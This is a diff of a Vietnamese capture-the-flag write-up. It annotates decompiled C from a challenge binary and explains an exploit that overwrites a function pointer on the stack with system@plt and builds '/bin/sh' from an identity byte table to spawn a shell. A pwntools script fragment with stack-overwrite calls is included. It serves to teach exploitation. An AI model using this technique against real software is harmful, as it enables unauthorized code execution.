@@ -80,7 +80,7 @@ void print_hex(long buf,ulong len)
 void session_done(void)
 
 {
-  system("echo \'[*] Goodbye!\'");
+  system("echo \'[*] Goodbye!\'"); // có system@plt trong binary
   return;
 }
 ```
@@ -100,7 +100,7 @@ void do_set(undefined8 buffer)
     puts("  [-] Invalid byte value");
   }
   else {
-    set_mapping(buffer,(int)(char)val1,(int)(char)val2);
+    set_mapping(buffer,(int)(char)val1,(int)(char)val2); // viết giá trị byte val2 vào vị trí val1 trên stack
     puts("  [+] Updated");
   }
   return;
@@ -154,7 +154,7 @@ void do_encode(long buffer)
   return;
 }
 ```
-* bug: thực thi code, gọi đến hàm `print_hex` với tham số là userinput  
+* bug: thực thi code, gọi đến hàm `print_hex` với tham số là từ user input  
   ```c
   (**(code **)(buffer + 0x20))(buf,len);
   ```
@@ -172,7 +172,7 @@ void do_reset(long buffer)
   option = readint();
   if (option == 1) {
     for (i = 0; i < 0x80; i = i + 1) {
-      *(char *)(buffer + 0x30 + (long)i) = (char)i;
+      *(char *)(buffer + 0x30 + (long)i) = (char)i;  // ascii table 
     }
     puts("  [+] Identity table set");
   }
@@ -195,7 +195,7 @@ void do_reset(long buffer)
   return;
 }
 ```
-* bug: option `1. Identity`, dùng để dựng chuỗi `/bin/sh` ở hàm `do_encode()`
+* bug: option `1. Identity`, để sau đó dùng bảng dựng chuỗi `/bin/sh` ở hàm `do_encode()`
 
 `do_dump()`:
 ```c
@@ -217,7 +217,13 @@ void do_dump(long buffer)
 ___
 ### Exploit:
 
+Ảnh stack với
+* `do_set()`: print_hex -> system
+* `do_reset()`: phần stack phía sau được biến đổi theo `Mode: 1`, biến thành bảng ascii
+
 <img width="656" height="440" alt="image" src="https://github.com/user-attachments/assets/0535c159-ddfd-492e-a6ae-84cb3f898eff" />
+
+* `do_encode()`: nhập giá trị byte phù hợp vào biến `text`, sao cho `buf` chứa `/bin/sh`. Từ đó thực thi `system(/bin/sh)`
 
 <img width="668" height="267" alt="image" src="https://github.com/user-attachments/assets/49de13be-8712-4dc1-8992-48d8b77b30d5" />
 
@@ -265,7 +271,7 @@ system_plt = p64(0x0000000000401110)
 
 p.sendlineafter(b"Name: ", b"Long")
 
-# overwrite tu 247 - 240
+# overwrite tu 247 - 240 
 do_set(247, 0)
 do_set(246, 0)
 do_set(245, 0)
